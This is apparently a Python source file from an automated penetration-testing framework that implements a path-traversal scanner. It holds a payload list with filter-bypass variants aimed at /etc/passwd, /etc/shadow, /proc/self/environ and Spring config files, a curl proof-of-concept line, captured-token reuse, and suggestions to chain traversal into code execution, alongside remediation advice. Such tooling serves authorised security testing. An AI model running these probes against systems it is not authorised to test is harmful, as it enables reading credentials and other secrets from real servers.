"""`scan_path_traversal` — deterministic path-traversal specialist
(workitem.md Phase 2.2).

Closes CWE-22 / CWE-23 / OWASP A01:2021 (broken access control via
file-system traversal). Closes the Juice Shop `directory-traversal-ftp`
manifest gap (the lead today never converts a recon hint into a
file-system probe).

Detection strategy
------------------

For each candidate file-path-shaped param, probe with a payload
cohort that traverses **out of the document root** and into well-
known sensitive files:

  * Linux — `/etc/passwd`, `/proc/self/environ`, `/etc/shadow`
  * Windows — `C:\\Windows\\win.ini`, `C:\\boot.ini`
  * Application — `web.xml`, `WEB-INF/web.xml`,
    `application.properties`

Payload variants (defeat naive filters):

  1. `../../../etc/passwd` — classic dot-dot-slash.
  2. `....//....//....//etc/passwd` — double-dot bypass for
     `replace("../", "")` filters.
  3. `..%2f..%2f..%2fetc%2fpasswd` — URL-encoded.
  4. `..%252f..%252f..%252fetc%2fpasswd` — double-URL-encoded.
  5. `/etc/passwd` — absolute path (when filter only blocks `..`).
  6. `file:///etc/passwd` — file:// scheme (when filter blocks
     traversal but accepts URI schemes).

Detection: response body contains the target file's distinctive
fingerprint (uid-0 line for passwd, `[boot loader]` for win.ini,
`HTTP_USER_AGENT=` for /proc/self/environ).

Auto-emits CWE-22 finding on detection. Severity:
  * **Critical** — `/etc/shadow`, `application.properties` (creds)
  * **High** — `/etc/passwd`, `web.xml`, `/proc/self/environ`
  * **Medium** — Windows `win.ini`, `boot.ini` (info only)

Per-(endpoint, param) dedup so one finding per vulnerable surface.
"""

from __future__ import annotations

import logging
import re
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# (label, payload, fingerprint_regex, severity)
# fingerprint_regex matches when the server actually read the file.
_PROBES: tuple[tuple[str, str, str, str], ...] = (
    # ---------- Linux passwd ----------
    (
        "linux_passwd_dotdot",
        "../../../../etc/passwd",
        r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:",
        "high",
    ),
    (
        "linux_passwd_double_dot",
        "....//....//....//....//etc/passwd",
        r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:",
        "high",
    ),
    (
        "linux_passwd_url_enc",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:",
        "high",
    ),
    (
        "linux_passwd_double_url_enc",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:",
        "high",
    ),
    (
        "linux_passwd_absolute",
        "/etc/passwd",
        r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:",
        "high",
    ),
    (
        "linux_passwd_file_uri",
        "file:///etc/passwd",
        r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:",
        "high",
    ),
    # ---------- Linux /proc/self/environ ----------
    (
        "linux_proc_environ",
        "../../../../proc/self/environ",
        r"(HTTP_USER_AGENT=|PATH=|PWD=|HOME=|LANG=)",
        "high",
    ),
    # ---------- Linux /etc/shadow (critical — hashes) ----------
    (
        "linux_shadow",
        "../../../../etc/shadow",
        # shadow format: user:$6$salt$hash:lastchange:...
        r"^[a-z_][a-z0-9_-]*:\$[0-9a-z]+\$",
        "critical",
    ),
    # ---------- Windows win.ini ----------
    (
        "windows_win_ini",
        "../../../../windows/win.ini",
        r"\[(extensions|fonts|mci extensions|files|Mail)\]",
        "medium",
    ),
    (
        "windows_boot_ini",
        "../../../../boot.ini",
        r"\[boot loader\]|\[operating systems\]",
        "medium",
    ),
    # ---------- Java web.xml ----------
    (
        "java_web_xml",
        "../../../WEB-INF/web.xml",
        r"<web-app|<servlet-name>|<servlet-mapping>",
        "high",
    ),
    # ---------- Spring application.properties (creds!) ----------
    (
        "spring_app_props",
        "../../../WEB-INF/classes/application.properties",
        # property=value — typically secrets land here
        r"(spring\.datasource\.|jdbc\.|server\.port|spring\.security\.)",
        "critical",
    ),
)


def _build_url_with_param(
    url: str, param_name: str, value: str,
    *, other_params: dict[str, str] | None = None,
) -> str:
    """Substitute the named param in the URL's query string."""
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    flat = {k: (v[0] if v else "") for k, v in qs.items()}
    if other_params:
        for k, v in other_params.items():
            if k != param_name and k not in flat:
                flat[k] = v
    flat[param_name] = value
    # safe="/:" so payloads that intentionally embed `/` survive,
    # but we still let the URL-encoded variants pass through unchanged.
    return urlunparse(
        parts._replace(query=urlencode(flat, doseq=False, safe="/:%")),
    )


def _emit_finding(
    *,
    url: str,
    param: str,
    payload_label: str,
    payload: str,
    response_excerpt: str,
    severity: str,
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        finding_id = tracer.add_vulnerability_report(
            title=f"Path traversal in `{param}` parameter",
            severity=severity,
            cwe="CWE-22",
            endpoint=url,
            target=url,
            category="path_traversal",
            verification_status="verified",
            confidence=0.95,
            description=(
                f"The `{param}` parameter at `{url}` accepts file-path "
                f"input and reads the resolved file from disk without "
                f"adequately validating that the resolved path stays "
                f"within the intended directory. Probe `{payload_label}` "
                f"with payload `{payload}` returned content matching the "
                f"target file's fingerprint, confirming directory "
                f"traversal."
            ),
            impact=(
                "Path traversal. Attacker reads arbitrary files on the "
                "server's filesystem.\n"
                "  * `/etc/passwd` → user enumeration.\n"
                "  * `/etc/shadow` → password hashes (critical — offline "
                "    crack).\n"
                "  * `application.properties` / config files → DB creds, "
                "    API keys, JWT signing secrets.\n"
                "  * `WEB-INF/web.xml` → reveals routing, filters, "
                "    deployment topology.\n"
                "  * `/proc/self/environ` → process environment, often "
                "    contains secrets injected as env vars.\n"
                "  * Pivot: combine with file-write primitives "
                "    (upload + traversal) for arbitrary write → RCE."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Param: {param}\n"
                f"Probe: {payload_label}\n"
                f"Payload: {payload}\n"
                f"Response excerpt:\n{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send GET request to {url} with `{param}` set to "
                f"`{payload}`.\n"
                f"2. The response contains content from the target "
                f"file.\n"
                f"3. Pivot: replace the target with other sensitive "
                f"files (`/etc/shadow`, app config, source code) to "
                f"escalate to credential theft / RCE."
            ),
            poc_script_code=(
                f"curl -sS -G '{url}' --data-urlencode '{param}={payload}'"
            ),
            remediation_steps=(
                "1. Validate the requested path against an allowlist of "
                "permitted files OR resolve the path and verify the "
                "canonical form is within the intended directory:\n"
                "     resolved = os.path.realpath(os.path.join(base_dir, "
                "user_input))\n"
                "     if not resolved.startswith(os.path.realpath(base_dir) "
                "+ os.sep): raise PermissionError\n"
                "2. Reject any input containing `..`, `~`, null bytes, "
                "or non-printable characters BEFORE resolving.\n"
                "3. Decode URL-encoding once and re-validate (defeats "
                "double-encoding bypasses).\n"
                "4. Run the file-serving service with a chroot or "
                "container-fs scoping so traversal can't escape into "
                "system files even if the application validation fails."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "U", "C": "H" if severity == "critical" else "L",
                "I": "N", "A": "N",
            },
            reasoning_trace=[
                f"Probed {param}= with traversal payload `{payload_label}`.",
                f"Payload: {payload}",
                "Response body matched the target file's fingerprint regex.",
                "Server reads attacker-controlled paths without scope check.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg
            record_finding_in_kg(
                finding_id=finding_id, url=url, param=param,
                cwe="CWE-22", severity=severity, category="path_traversal",
                method="GET", detection_kind=payload_label[:60],
                confidence=0.95,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_path_traversal: kg record failed: %s", e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_path_traversal: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="path-traversal-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 60},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1083", "T1005"],
)
def scan_path_traversal(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    other_params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
) -> SpecialistResult:
    """Deterministic path-traversal scanner.

    Args:
        url: target URL.
        params: param names that look file-path-shaped (`file`, `path`,
            `filename`, `doc`, `template`, `page`, `include`, `download`,
            `image`). When None, scanner infers from URL query keys
            against a path-shaped lexicon.
        param: convenience alias for a single param name.
        other_params: baseline values for non-target params on the URL.
        extra_headers: forwarded as-is.

    Auto-emits one finding per vulnerable (endpoint, param) pair.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    # Forgiving args.
    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]

    parsed = urlparse(url)
    if not params:
        from urllib.parse import parse_qs
        qs_keys = list(parse_qs(parsed.query).keys())
        # File-path-shaped param names from real-world bugs.
        path_lexicon = {
            "file", "filename", "filepath", "path", "doc", "document",
            "template", "page", "include", "inc", "load", "view",
            "show", "download", "dl", "image", "img", "src", "name",
            "open", "read", "fetch", "asset", "resource", "static",
            "data", "log", "f",
        }
        params = [k for k in qs_keys if k.lower() in path_lexicon]
        if not params:
            params = qs_keys
    if not params:
        return SpecialistResult(
            status="partial",
            error="no path-shaped params found",
            evidence=[
                f"scan_path_traversal invoked on {url!r}; supply "
                "`params=[...]` or include a query string with file-"
                "path-shaped params (e.g. `?file=...`, `?page=...`, "
                "`?download=...`)."
            ],
        )

    # Auto-include captured auth from SecurityContext.
    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {
        h.lower() for h in extra_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    for raw_param in params:
        if not isinstance(raw_param, str) or not raw_param.strip():
            continue
        p = raw_param.strip()
        key = (parsed.path or "/", p)
        if key in seen_endpoint_param:
            continue

        for label, payload, fingerprint_re, severity in _PROBES:
            probe_url = _build_url_with_param(url, p, payload, other_params=other_params)
            try:
                resp = pm.send_simple_request(
                    "GET", probe_url,
                    headers=extra_headers, body="", timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"transport error ({label}): {e}")
                continue
            if "error" in resp and not resp.get("status_code"):
                continue
            body = resp.get("body") or ""
            if not isinstance(body, str):
                continue
            m = re.search(fingerprint_re, body, re.IGNORECASE | re.MULTILINE)
            if m:
                seen_endpoint_param.add(key)
                start = max(0, m.start() - 100)
                end = min(len(body), m.end() + 200)
                excerpt = body[start:end]
                rid = _emit_finding(
                    url=url, param=p, payload_label=label,
                    payload=payload, response_excerpt=excerpt,
                    severity=severity,
                )
                if rid:
                    emitted_count += 1
                drafts.append(FindingDraft(
                    title=f"Path traversal in `{p}` ({label})",
                    severity=severity, cwe="CWE-22",
                    endpoint=url, category="path_traversal",
                    verification_status="verified", confidence=0.95,
                    description=f"Traversal: {label} → {payload} fingerprint matched",
                ))
                evidence.append(
                    f"path traversal: {p}={payload} (fingerprint {label})"
                )
                break  # one finding per param

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="GET", params=params, probed_for="path_traversal")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_path_traversal"},
            input={"params": list(params), "probes_sent": probe_count},
            output={"findings_emitted": emitted_count, "drafts": len(drafts)},
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["chain traversal with file-write primitives — upload "
             "endpoints accepting user-controlled filenames; "
             "writeable path segments allow code-on-disk → RCE"]
            if drafts else
            ["no path traversal on listed params; consider POST/JSON "
             "body fields with filename shape, header-based path "
             "selection (X-Original-URL), and routes with embedded "
             "filename segments (/api/files/<name>)"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "findings_emitted_to_tracer": emitted_count,
        },
    )
